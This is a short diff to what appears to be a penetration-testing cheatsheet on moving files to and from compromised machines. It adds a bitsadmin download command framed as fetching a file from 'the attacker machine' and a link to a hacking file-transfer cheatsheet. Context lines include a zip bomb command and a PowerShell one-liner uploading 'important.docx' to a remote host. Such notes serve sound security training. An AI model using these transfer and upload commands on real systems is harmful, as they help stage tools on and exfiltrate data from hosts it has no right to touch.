@@ -190,6 +190,13 @@ systemctl disable ssh
 ```
 dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
 ```
+# Bitsadmin
+
+The /transfer in bitsadmin is one of the simplest ways to download the file from the attacker machine
+
+```
+bitsadmin /transfer job https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Temp\putty.exe
+```
 
 # TFTP File Transfer
 
@@ -418,3 +425,8 @@ Upload file
 ```
  C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
 ```
+
+
+
+https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/
+
